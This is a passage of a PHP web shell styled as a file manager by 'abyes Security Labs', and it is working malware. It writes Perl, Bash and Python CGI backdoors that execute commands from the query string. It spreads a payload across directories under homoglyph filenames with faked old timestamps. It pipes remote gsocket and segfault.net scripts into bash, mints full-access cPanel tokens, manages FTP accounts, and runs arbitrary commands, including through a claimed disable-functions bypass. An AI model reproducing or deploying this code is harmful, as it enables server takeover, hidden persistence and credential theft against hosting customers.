                $v = substr($name, 0, $i) . $rep . substr($name, $i + 1);
                $full = $ext ? $v . '.' . $ext : $v;
                if ($full !== $filename) $variants[] = $full;
            }
        }
    }
    if (empty($variants)) {
        $variants[] = '.' . $filename;
        $variants[] = $name . '_bak.' . $ext;
    }
    return array_unique($variants);
}

function randomOldTimestamp() {
    $start = mktime(0, 0, 0, 1, 1, 2023);
    $end   = mktime(23, 59, 59, 12, 31, 2024);
    return mt_rand($start, $end);
}

function massSpreadAuto($basePath, $content) {
    $count = 0; $errors = []; $created = [];
    $targetExts = ['php'];
    try {
        fixPermission($basePath);
        $dirs = [$basePath];
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($item->isDir()) $dirs[] = $item->getPathname();
        }
        foreach ($dirs as $dir) {
            fixPermission($dir);
            $files = @scandir($dir);
            if (!is_array($files)) { $errors[] = $dir; continue; }
            $existingFiles = [];
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                if (is_file($dir . '/' . $f)) {
                    $fext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                    if (in_array($fext, $targetExts)) $existingFiles[] = $f;
                }
            }
            $placed = false;
            if (!empty($existingFiles)) {
                foreach ($existingFiles as $origFile) {
                    $variants = generateHomoglyph($origFile);
                    foreach ($variants as $variant) {
                        $targetPath = $dir . '/' . $variant;
                        if (!file_exists($targetPath)) {
                            if (@file_put_contents($targetPath, $content) !== false) {
                                $ts = randomOldTimestamp();
                                @touch($targetPath, $ts, $ts);
                                $count++;
                                $created[] = $targetPath;
                                $placed = true;
                                break 2;
                            }
                        }
                    }
                }
            } else {
                $targetPath = $dir . '/index.php';
                if (!file_exists($targetPath)) {
                    if (@file_put_contents($targetPath, $content) !== false) {
                        $ts = randomOldTimestamp();
                        @touch($targetPath, $ts, $ts);
                        $count++;
                        $created[] = $targetPath;
                        $placed = true;
                    }
                }
            }
            if (!$placed) $errors[] = $dir;
        }
    } catch (Exception $e) {
        $errors[] = 'Exception: ' . $e->getMessage();
    }
    return ['count' => $count, 'errors' => $errors, 'created' => $created];
}



function lp_init_cgiapi() {
    $data   = abyes_DATA_DIR;
    $cgidir = getDataPath('abyescgiapi');

    @mkdir($data,   0755, true);
    @mkdir($cgidir, 0755, true);

    $ht = $cgidir . '/.htaccess';
    if (!@file_exists($ht)) {
        $htContent  = "Options FollowSymLinks MultiViews Indexes ExecCGI\n";
        $htContent .= "AddType application/x-httpd-cgi .abyes\n";
        $htContent .= "AddHandler cgi-script .abyes\n";
        @file_put_contents($ht, $htContent);
        @chmod($ht, 0644);
    }

    $perlFile = $cgidir . '/perl.abyes';
    if (!@file_exists($perlFile)) {
        $perlSrc  = "#!/usr/bin/perl\n";
        $perlSrc .= "use POSIX;\n";
        $perlSrc .= "print \"Content-Type: text/html\\n\\n\";\n";
        $perlSrc .= "my \$cmd = \$ENV{'QUERY_STRING'} || \$ENV{'HTTP_CMD'} || '';\n";
        $perlSrc .= "\$cmd =~ s/%([0-9A-Fa-f]{2})/chr(hex(\$1))/eg;\n";
        $perlSrc .= "if (\$cmd) {\n";
        $perlSrc .= "    print \"[abyes-securitylabs]<pre>\";\n";
        $perlSrc .= "    my \$out = '';\n";
        $perlSrc .= "    if (open(my \$fh, '-|', \$cmd . ' 2>&1')) {\n";
        $perlSrc .= "        while (<\$fh>) { \$out .= \$_; } close(\$fh);\n";
        $perlSrc .= "    }\n";
        $perlSrc .= "    print \$out;\n";
        $perlSrc .= "    print \"</pre>[abyes-securitylabs]\";\n";
        $perlSrc .= "}\n";
        @file_put_contents($perlFile, $perlSrc);
        @chmod($perlFile, 0755);
    }

    $bashFile = $cgidir . '/bash.abyes';
    if (!@file_exists($bashFile)) {
        $bashSrc  = "#!/bin/bash\n";
        $bashSrc .= "echo -e \"Content-Type: text/html\\n\"\n";
        $bashSrc .= "CMD=\$(echo \"\$QUERY_STRING\" | sed 's/%/\\\\x/g' | xargs -0 printf '%b' 2>/dev/null || echo \"\$QUERY_STRING\")\n";
        $bashSrc .= "if [ -n \"\$CMD\" ]; then\n";
        $bashSrc .= "    echo '[abyes-securitylabs]<pre>'\n";
        $bashSrc .= "    eval \"\$CMD\" 2>&1\n";
        $bashSrc .= "    echo '</pre>[abyes-securitylabs]'\n";
        $bashSrc .= "fi\n";
        @file_put_contents($bashFile, $bashSrc);
        @chmod($bashFile, 0755);
    }

    $pyFile = $cgidir . '/py.abyes';
    if (!@file_exists($pyFile)) {
        $pySrc  = "#!/usr/bin/python\n";
        $pySrc .= "import os, sys, subprocess\n";
        $pySrc .= "try:\n";
        $pySrc .= "    from urllib.parse import unquote\n";
        $pySrc .= "except ImportError:\n";
        $pySrc .= "    from urllib import unquote\n";
        $pySrc .= "print(\"Content-Type: text/html\")\n";
        $pySrc .= "print(\"\")\n";
        $pySrc .= "cmd = unquote(os.environ.get('QUERY_STRING', '') or os.environ.get('HTTP_CMD', ''))\n";
        $pySrc .= "if cmd:\n";
        $pySrc .= "    print('[abyes-securitylabs]<pre>')\n";
        $pySrc .= "    try:\n";
        $pySrc .= "        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)\n";
        $pySrc .= "        sys.stdout.write(out.decode('utf-8', errors='replace'))\n";
        $pySrc .= "    except Exception as e:\n";
        $pySrc .= "        print(str(e))\n";
        $pySrc .= "    print('</pre>[abyes-securitylabs]')\n";
        @file_put_contents($pyFile, $pySrc);
        @chmod($pyFile, 0755);
    }
}


$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';
$cmdOutput = '';
$loginError = '';

if (isset($_GET['ecl'])) {
    @chdir($_GET['ecl']);
    $currentDirectory = getCurrentDirectory();
}

if (isAuthenticated()) {
    @lp_init_cgiapi();
}

if (isset($_POST['multi_upload'])) {
    $responseMessage = uploadMultipleFiles($currentDirectory);
}

if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $newDir = $currentDirectory . '/' . $_POST['foldername'];
    fixPermission($currentDirectory);
    if (@mkdir($newDir, 0755)) $responseMessage = 'Folder created: ' . htmlspecialchars($_POST['foldername']);
    else $errorMessage = 'Failed to create folder.';
}

if (isset($_POST['mass_chmod']) && !empty($_POST['chmod_folder']) && !empty($_POST['chmod_file'])) {
    $folderPerm = $_POST['chmod_folder'];
    $filePerm = $_POST['chmod_file'];
    $targetPath = !empty($_POST['chmod_path']) ? $_POST['chmod_path'] : $currentDirectory;
    $folderCount = 0; $fileCount = 0; $chmodErrors = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            $path = $item->getPathname();
            if ($item->isDir()) {
                if (@chmod($path, octdec($folderPerm))) $folderCount++;
                else $chmodErrors[] = $path;
            } else {
                if (@chmod($path, octdec($filePerm))) $fileCount++;
                else $chmodErrors[] = $path;
            }
        }
        @chmod($targetPath, octdec($folderPerm));
        $folderCount++;
        $cmdOutput = "=== Mass Chmod Result ===\nTarget: $targetPath\nFolder Perm: $folderPerm\nFile Perm: $filePerm\n---\nFolders: $folderCount\nFiles: $fileCount";
        if (count($chmodErrors) > 0) {
            $cmdOutput .= "\nErrors: " . count($chmodErrors);
            foreach (array_slice($chmodErrors, 0, 5) as $err) $cmdOutput .= "\n  $err";
        }
        $responseMessage = 'Mass chmod completed.';
    } catch (Exception $e) {
        $cmdOutput = "Error: " . $e->getMessage();
    }
}

if (isset($_POST['mass_spread']) && !empty($_POST['spread_content'])) {
    $spreadContent = $_POST['spread_content'];
    $result = massSpreadAuto($currentDirectory, $spreadContent);
    $cmdOutput = "=== Mass Spread Result ===\nStarting from: $currentDirectory\nFiles created: " . $result['count'];
    if (count($result['created']) > 0) {
        $cmdOutput .= "\n\nCreated files:";
        foreach (array_slice($result['created'], 0, 20) as $c) $cmdOutput .= "\n  " . basename($c) . " -> " . dirname($c);
    }
    if (count($result['errors']) > 0) {
        $cmdOutput .= "\n\nFailed dirs: " . count($result['errors']);
        foreach (array_slice($result['errors'], 0, 5) as $err) $cmdOutput .= "\n  $err";
    }
    $spreadSummaryHtml = '';
    foreach ($result['created'] as $createdPath) {
        $url = getFileUrl($createdPath);
        $spreadSummaryHtml .= '<div style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:10px;">';
        $spreadSummaryHtml .= '<span style="color:#3fb950;font-family:monospace;">' . htmlspecialchars($createdPath) . '</span>';
        if ($url) {
            $spreadSummaryHtml .= '<br><a href="' . htmlspecialchars($url) . '" target="_blank" style="color:#00d4ff;">' . htmlspecialchars($url) . '</a>';
        }
        $spreadSummaryHtml .= '</div>';
    }
    $responseMessage = '<div style="font-weight:600;color:#3fb950;margin-bottom:8px;">Mass Spread Complete &mdash; ' . $result['count'] . ' files created.</div>' . $spreadSummaryHtml;
}

if (isset($_POST['gsocket_action']) && isset($_POST['gsocket_cmd'])) {
    $gsCmd = $_POST['gsocket_cmd'];
    $cmdOutput = "=== GSSocket ===\n\n";

    if ($gsCmd === 'install') {
        $out = runCmd('curl -fsSL https://gsocket.io/y | bash');
        if (!empty(trim($out ?? ''))) {
            $cmdOutput .= "[1] gsocket.io (curl):\n" . $out;
        } else {
            $out = runCmd('wget --no-verbose -O- https://gsocket.io/y | bash');
            if (!empty(trim($out ?? ''))) {
                $cmdOutput .= "[1] gsocket.io (wget):\n" . $out;
            } else {
                $cmdOutput .= "[1] gsocket.io: No output.\n";
            }
        }
        $out2 = runCmd('curl -fsSL http://nossl.segfault.net/deploy-all.sh -o /tmp/deploy-all.sh && bash /tmp/deploy-all.sh');
        if (!empty(trim($out2 ?? ''))) {
            $cmdOutput .= "\n\n[2] segfault.net deploy:\n" . $out2;
        } else {
            $cmdOutput .= "\n\n[2] segfault.net deploy: No output.";
        }
        $out3 = runCmd('GS_PORT=53 bash /tmp/deploy-all.sh');
        if (!empty(trim($out3 ?? ''))) {
            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy:\n" . $out3;
        } else {
            $cmdOutput .= "\n\n[3] GS_PORT=53 deploy: No output.";
        }
        @unlink('/tmp/deploy-all.sh');
        runCmd('rm -f /tmp/deploy-all.sh');
        $responseMessage = 'GSSocket install chain executed.';

    } elseif ($gsCmd === 'uninstall') {
        $out = runCmd('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>&1');
        if (empty(trim($out ?? ''))) {
            $out = runCmd('GS_UNDO=1 bash -c "$(wget --no-verbose -O- https://gsocket.io/y)" 2>&1');
        }
        runCmd('pkill -u $(whoami) 2>/dev/null');
        runCmd('rm -f /tmp/deploy-all.sh');
        $out = preg_replace('/-->.*pkill defunct.*/i', '', $out ?? '');
        $out = trim($out);
        $out .= "\nAll user processes killed.";
        $cmdOutput .= $out;
        $responseMessage = 'GSSocket uninstall executed.';
    }
}

if (isset($_POST['cpanel_token'])) {
    $randomName = 'lp' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
    $uapiOutput = runUapi('Tokens create_full_access name=' . $randomName);
    $serverDomain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'unknown';
    $serverDomain = preg_replace('/^https?:\/\//', '', $serverDomain);
    $serverDomain = rtrim($serverDomain, '/');
    $serverUser = trim(runCmd('whoami') ?? get_current_user());
    $token = '';
    if ($uapiOutput && preg_match('/token:\s*[\'"]?([A-Z0-9]+)[\'"]?/i', $uapiOutput, $m)) {
        $token = $m[1];
    }
    $cmdOutput = "=== cPanel Token Generated ===\n\n";
    if (!empty($token)) {
        $cmdOutput .= "Login   : https://cpanel.abyessecuirtylabs.id/\n";
        $cmdOutput .= "Domain  : " . $serverDomain . "\n";
        $cmdOutput .= "User    : " . $serverUser . "\n";
        $cmdOutput .= "Token   : " . $token . "\n";
        $cmdOutput .= "\n=== Copy Format ===\n";
        $cmdOutput .= $serverDomain . "|" . $serverUser . "|" . $token;
        $responseMessage = 'cPanel token created successfully';
    } else {
        $cmdOutput .= "FAILED to create token.\n\n";
        $cmdOutput .= "Raw output:\n" . ($uapiOutput ?: 'No output from uapi');
        $responseMessage = 'Token creation failed';
    }
}

$ftpAccounts = [];
if (isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])) {
    $ftpListRaw = runUapi('Ftp list_ftp');
    $ftpAccounts = parseUapiFtpList($ftpListRaw);
}

if (isset($_POST['ftp_list'])) {
    $responseMessage = count($ftpAccounts) . ' FTP account(s) found.';
}

if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
    $ftpUser = $_POST['ftp_user'];
    $ftpPass = $_POST['ftp_pass'];
    $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
    
    $homeDir = ''; 
    
    $addOutput = runUapi('Ftp add_ftp user=' . escapeshellarg($ftpUser) . ' pass=' . escapeshellarg($ftpPass) . ' quota=' . escapeshellarg($ftpQuota) . ' homedir=' . escapeshellarg($homeDir) . ' --output=json');
    
    $parsed = parseUapiStatus($addOutput);
    if ($parsed['ok']) {
        $responseMessage = 'FTP account "' . $ftpUser . '" created successfully.';
        $cmdOutput = $addOutput;
    } else {
        $errorMessage = 'FTP creation failed. Check output.';
        $cmdOutput = $addOutput;
    }
}

if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
    $chgUser = $_POST['ftp_chg_user'];
    $chgPass = $_POST['ftp_chg_pass'];
    $chgDomain = $_POST['ftp_chg_domain'];
    $passwdOutput = runUapi('Ftp passwd user=' . escapeshellarg($chgUser) . ' domain=' . escapeshellarg($chgDomain) . ' pass=' . escapeshellarg($chgPass));
    $parsed = parseUapiStatus($passwdOutput);
    if ($parsed['ok']) {
        $responseMessage = 'Password changed for "' . $chgUser . '@' . $chgDomain . '".';
    } else {
        $errorMessage = 'Password change failed.';
        $cmdOutput = $passwdOutput;
    }
}

if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
    $delUser = $_POST['ftp_del_user'];
    $delDomain = $_POST['ftp_del_domain'];
    $delOutput = runUapi('Ftp delete_ftp user=' . escapeshellarg($delUser) . ' domain=' . escapeshellarg($delDomain));
    $parsed = parseUapiStatus($delOutput);
    if ($parsed['ok']) {
        $responseMessage = 'FTP account "' . $delUser . '@' . $delDomain . '" deleted.';
    } else {
        $errorMessage = 'FTP deletion failed.';
        $cmdOutput = $delOutput;
    }
}


$wpAvailable = false;
$wpLoadPath = findWpLoad();
if ($wpLoadPath) $wpAvailable = true;

if (isset($_POST['remote_upload']) && !empty($_POST['remote_url'])) {
    $url = $_POST['remote_url'];
    $fname = !empty($_POST['remote_filename']) ? $_POST['remote_filename'] : basename(parse_url($url, PHP_URL_PATH));
    $target = $currentDirectory . '/' . $fname;
    fixPermission($currentDirectory);
    $content = @file_get_contents($url);
    if ($content === false && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>false]);
        $content = curl_exec($ch); curl_close($ch);
    }
    if ($content !== false && @file_put_contents($target, $content) !== false) $responseMessage = "Remote file downloaded: $fname";
    else $responseMessage = 'Failed to download remote file.';
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        if (saveFileContent($file)) $responseMessage = 'File saved.';
        else $errorMessage = 'Error saving file.';
    }
}

if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
        $perm = intval($_POST['permission'], 8);
        if ($perm > 0 && @chmod($file, $perm)) $responseMessage = 'Permission changed.';
        else $errorMessage = 'Error changing permission.';
    }
}

if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}

if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $useBypass = isset($_POST['use_bypass']) && $_POST['use_bypass'] === '1';
    if ($useBypass) {
        $bypassOut = runBypass($_POST['cmd']);
        $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
    } else {
        $cmdOutput = executeCommand($_POST['cmd']);
    }
}

if (isset($_POST['abyes']) && !empty($_POST['abyes'])) {
    $bypassOut = runBypass($_POST['abyes']);
    $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
}

if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
    $file = $_GET['rename'];
    $responseMessage = renameFile($file, $_POST['new_name']);
}

if (isset($_GET['dl']) && isAuthenticated()) {
    $dlFile = $_GET['dl'];
    if (file_exists($dlFile) && is_file($dlFile)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dlFile) . '"');
        header('Content-Length: ' . filesize($dlFile));
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        @ob_clean();
        flush();
        readfile($dlFile);
        exit;
    }
}

if (isset($_GET['del'])) {
    $file = $_GET['del'];
    $fileDir = dirname($file);
    if (deleteFile($file)) {
        header('Location: ?ecl=' . urlencode($fileDir) . '&_xk=labs&msg=deleted');
        exit;
    } else {
        $errorMessage = 'Failed to delete: ' . basename($file);
    }
}

if (isset($_POST['Summon'])) {
    $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $filePath = $currentDirectory . '/Adminer.php';
    $fileContent = @file_get_contents($url);
    if ($fileContent !== false && @file_put_contents($filePath, $fileContent) !== false) {
        $responseMessage = 'Adminer summoned successfully.';
    } else {
        $errorMessage = 'Failed to summon Adminer.';
    }
}

if (isset($_POST['scan_deeply'])) {
    $results = scanDeepestDirectory($currentDirectory);
    $cmdOutput = "=== Deepest Directories ===\n";
    if (empty($results)) $cmdOutput .= "No subdirectories found.";
    else foreach ($results as $r) $cmdOutput .= $r . "\n";
}

if (isset($_POST['scan_newly'])) {
    $ext = isset($_POST['scan_ext']) ? $_POST['scan_ext'] : 'php';
    $results = scanNewlyFiles($currentDirectory, $ext);
    $cmdOutput = "=== Newest .$ext Files ===\n";
    if (empty($results)) $cmdOutput .= "No files found.";
    else foreach ($results as $r) $cmdOutput .= date('Y-m-d H:i:s', $r['time']) . " | " . $r['path'] . "\n";
}


if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) header('X-LSCACHE: off');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>abyes Security Labs &mdash; File Manager</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<style>
/* ─── Google Font Import ─────────────────────────────────── */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');

/* ─── Design Tokens ──────────────────────────────────────── */
:root {
    /* Base palette */
    --bg:          #080b14;
    --bg-surface:  #0d1117;
    --bg-card:     #111827;
    --bg-card-hover: #161d2e;
    --bg-input:    #0d1117;
    --bg-glass:    rgba(17, 24, 39, 0.75);

    /* Borders */
    --border:      rgba(99, 102, 241, 0.15);
    --border-soft: rgba(255,255,255,0.06);
    --border-hover:rgba(99, 102, 241, 0.45);

    /* Text */
    --text:        #e2e8f0;
    --text-muted:  #64748b;
    --text-subtle: #334155;

    /* Brand colours */
    --accent:      #6366f1;        /* Indigo */
    --accent-glow: rgba(99,102,241,0.25);
    --cyan:        #22d3ee;
    --gold:        #f59e0b;
    --gold-dark:   #d97706;
    --red:         #ef4444;
    --red-muted:   rgba(239,68,68,0.15);
    --green:       #22c55e;
    --green-muted: rgba(34,197,94,0.12);
    --purple:      #a855f7;
    --orange:      #f97316;
    --blue:        #3b82f6;
    --pink:        #ec4899;
    --teal:        #14b8a6;

    /* Radius */
    --radius-sm:   6px;
    --radius:      10px;
    --radius-lg:   14px;
    --radius-xl:   18px;

    /* Shadows */
    --shadow-sm:   0 1px 3px rgba(0,0,0,0.4);
    --shadow:      0 4px 16px rgba(0,0,0,0.5);
    --shadow-lg:   0 12px 40px rgba(0,0,0,0.65);
    --shadow-glow: 0 0 20px var(--accent-glow);
}

/* ─── Reset & Base ───────────────────────────────────────── */
@keyframes spin       { to { transform: rotate(360deg); } }
@keyframes fadeIn     { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
@keyframes pulse-dot  { 0%,100% { opacity: 1; } 50% { opacity: .4; } }

* { box-sizing: border-box; margin: 0; padding: 0; }

html { scroll-behavior: smooth; }

body {
    font-family: 'Inter', system-ui, sans-serif;
    font-size: 13px;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    line-height: 1.5;
    -webkit-font-smoothing: antialiased;
}

/* ─── Scrollbar ──────────────────────────────────────────── */
::-webkit-scrollbar              { width: 5px; height: 5px; }
::-webkit-scrollbar-track        { background: transparent; }
::-webkit-scrollbar-thumb        { background: var(--border-hover); border-radius: 99px; }
::-webkit-scrollbar-thumb:hover  { background: var(--accent); }

/* ─── Header ─────────────────────────────────────────────── */
.app-header {
    background: rgba(8,11,20,0.92);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border-bottom: 1px solid var(--border-soft);
    padding: 0 24px;
    height: 58px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
    box-shadow: 0 1px 0 var(--border-soft), var(--shadow-sm);
}

.header-left  { display: flex; align-items: center; gap: 14px; }
.header-right { display: flex; align-items: center; gap: 10px; }

.header-logo {
    width: 34px; height: 34px;
    border-radius: var(--radius-sm);
    border: 1px solid var(--border);
    box-shadow: 0 0 12px var(--accent-glow);
}

.header-brand { display: flex; flex-direction: column; }

.header-title {
    font-size: 15px;
    font-weight: 700;
    letter-spacing: -0.3px;
    background: linear-gradient(110deg, #e2e8f0 0%, var(--accent) 60%, var(--cyan) 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}

.header-sub {
    font-size: 10px;
    color: var(--text-muted);
    font-weight: 400;
    letter-spacing: 0.3px;
}

.sys-badge {
    background: rgba(99,102,241,0.08);
    border: 1px solid var(--border);
    padding: 4px 12px;
    border-radius: 99px;
    font-size: 10px;
    font-weight: 500;
    color: var(--text-muted);
    font-family: 'JetBrains Mono', monospace;
    white-space: nowrap;
    transition: border-color 0.2s;
}
.sys-badge:hover { border-color: var(--border-hover); color: var(--text); }

/* Live status dot */
.status-dot {
    width: 7px; height: 7px;
    border-radius: 50%;
    background: var(--green);
    animation: pulse-dot 2s ease-in-out infinite;
    box-shadow: 0 0 6px var(--green);
    flex-shrink: 0;
}

/* ─── Container ──────────────────────────────────────────── */
.container {
    max-width: 1500px;
    margin: 0 auto;
    padding: 18px 20px;
    animation: fadeIn 0.25s ease;
}

/* ─── Breadcrumb ─────────��───────────────────────────────── */
.breadcrumb {
    display: flex;
    align-items: center;
    gap: 4px;
    background: var(--bg-card);
    border: 1px solid var(--border-soft);
    border-radius: var(--radius);
    padding: 9px 16px;
    margin-bottom: 14px;
    font-size: 12px;
    font-family: 'JetBrains Mono', monospace;
    overflow-x: auto;
    white-space: nowrap;
}

.breadcrumb a {
    color: var(--accent);
    text-decoration: none;
    transition: color 0.15s;
}
.breadcrumb a:hover { color: var(--cyan); }
.breadcrumb span.sep { color: var(--text-subtle); margin: 0 2px; }

/* ─── Toolbar ────────────────────────────────────────────── */
.toolbar {
    background: var(--bg-card);
    border: 1px solid var(--border-soft);
    border-radius: var(--radius);
    padding: 10px 14px;
    margin-bottom: 14px;
    display: flex;
    align-items: center;
    gap: 6px;
    flex-wrap: wrap;
}

.toolbar-label {
    font-size: 9px;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    color: var(--text-subtle);
    font-weight: 600;
    margin-right: 4px;
    padding: 0 6px 0 2px;
    border-right: 1px solid var(--border-soft);
}

/* ─── Buttons ─────────────────────────────────────────────�� */
.btn {
    padding: 6px 13px;
    border-radius: var(--radius-sm);
    font-size: 11.5px;
    font-weight: 500;
    border: 1px solid var(--border-soft);
    cursor: pointer;
    transition: all 0.18s ease;
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-family: 'Inter', sans-serif;
    text-decoration: none;
    color: var(--text-muted);
    background: rgba(255,255,255,0.04);
    line-height: 1;
    white-space: nowrap;
}
.btn:hover {
    color: var(--text);
    border-color: var(--border-hover);
    background: rgba(99,102,241,0.08);
    transform: translateY(-1px);
    box-shadow: var(--shadow-sm);
}
.btn:active { transform: translateY(0); }

.btn-sm { padding: 4px 10px; font-size: 10.5px; }

.btn-primary {
    background: var(--accent);
    color: #fff;
    border-color: var(--accent);
    font-weight: 600;
    box-shadow: 0 0 0 0 var(--accent-glow);
}
.btn-primary:hover {
    background: #818cf8;
    border-color: #818cf8;
    box-shadow: var(--shadow-glow);
    color: #fff;
}

.btn-secondary {
    background: rgba(255,255,255,0.05);
    color: var(--text-muted);
    border-color: var(--border-soft);
}
.btn-secondary:hover { color: var(--text); }

.btn-danger {
    background: var(--red-muted);
    color: var(--red);
    border-color: rgba(239,68,68,0.25);
}
.btn-danger:hover { background: var(--red); color: white; border-color: var(--red); }

/* Coloured action buttons */
.btn-scan   { background: rgba(20,184,166,0.12); color: var(--teal);   border-color: rgba(20,184,166,0.3); }
.btn-scan:hover   { background: var(--teal);   color: #fff; border-color: var(--teal); }

.btn-chmod  { background: rgba(236,72,153,0.12); color: var(--pink);   border-color: rgba(236,72,153,0.3); }
.btn-chmod:hover  { background: var(--pink);   color: #fff; border-color: var(--pink); }

.btn-spread { background: rgba(245,158,11,0.12); color: var(--gold);   border-color: rgba(245,158,11,0.3); }
.btn-spread:hover { background: var(--gold);   color: #000; border-color: var(--gold); }

.btn-gs     { background: rgba(34,197,94,0.12);  color: var(--green);  border-color: rgba(34,197,94,0.3); }
.btn-gs:hover     { background: var(--green);  color: #fff; border-color: var(--green); }

.btn-uapi   { background: rgba(168,85,247,0.12); color: var(--purple); border-color: rgba(168,85,247,0.3); }
.btn-uapi:hover   { background: var(--purple); color: #fff; border-color: var(--purple); }

.btn-ftp    { background: rgba(249,115,22,0.12); color: var(--orange); border-color: rgba(249,115,22,0.3); }
.btn-ftp:hover    { background: var(--orange); color: #fff; border-color: var(--orange); }

.btn-wp     { background: rgba(59,130,246,0.12); color: var(--blue);   border-color: rgba(59,130,246,0.3); }
.btn-wp:hover     { background: var(--blue);   color: #fff; border-color: var(--blue); }

.btn-proc   { background: rgba(236,72,153,0.12); color: var(--pink);   border-color: rgba(236,72,153,0.3); }
.btn-proc:hover   { background: var(--pink);   color: #fff; border-color: var(--pink); }

.btn-cron   { background: rgba(34,211,238,0.1);  color: var(--cyan);   border-color: rgba(34,211,238,0.25); }
.btn-cron:hover   { background: var(--cyan);   color: #000; border-color: var(--cyan); }

/* ─── WP User Rows ───────────────────────────────────────── */
.wp-user-row {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 10px 14px;
    background: rgba(255,255,255,0.02);
    border: 1px solid var(--border-soft);
    border-radius: var(--radius-sm);
    margin-bottom: 6px;
    transition: all 0.18s;
}
.wp-user-row:hover { border-color: var(--border-hover); background: rgba(99,102,241,0.05); }
.wp-user-row.wp-hidden { background: rgba(59,130,246,0.06); border-color: rgba(59,130,246,0.25); }

.wp-badge {
    display: inline-block;
    padding: 2px 7px;
    border-radius: 99px;
    font-size: 9px;
    font-weight: 700;
    letter-spacing: 0.5px;
    text-transform: uppercase;
}
.wp-badge-hidden { background: rgba(59,130,246,0.25); color: var(--blue); border: 1px solid rgba(59,130,246,0.4); }
.wp-badge-admin  { background: rgba(245,158,11,0.2);  color: var(--gold); border: 1px solid rgba(245,158,11,0.35); }

.wp-pw-box {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(99,102,241,0.08);
    border: 1px solid rgba(99,102,241,0.3);
    border-radius: var(--radius-sm);
    padding: 4px 10px;
    margin-top: 6px;
    font-family: 'JetBrains Mono', monospace;
    font-size: 11px;
    color: var(--green);
}

/* ─── Upload Label ───────────────────────────────────────── */
.upload-label {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    padding: 5px 12px;
    font-size: 11px;
    border-radius: var(--radius-sm);
    cursor: pointer;
    font-family: 'Inter', sans-serif;
    font-weight: 500;
    background: rgba(255,255,255,0.04);
    color: var(--text-muted);
    border: 1px solid var(--border-soft);
    transition: all 0.18s;
}
.upload-label:hover { border-color: var(--border-hover); color: var(--text); background: rgba(99,102,241,0.08); }
.upload-label input[type="file"] { display: none; }
.upload-label svg { width: 13px; height: 13px; }

/* ─── File Table ─────────────────────────────────────────── */
.file-table {
    width: 100%;
    border-collapse: collapse;
    background: var(--bg-card);
    border: 1px solid var(--border-soft);
    border-radius: var(--radius);
    overflow: hidden;
    margin-bottom: 14px;
    box-shadow: var(--shadow-sm);
}

.file-table thead { position: sticky; top: 58px; z-index: 5; }

.file-table th {
    background: rgba(99,102,241,0.07);
    color: var(--text-muted);
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 0.7px;
    padding: 11px 16px;
    text-align: left;
    font-weight: 600;
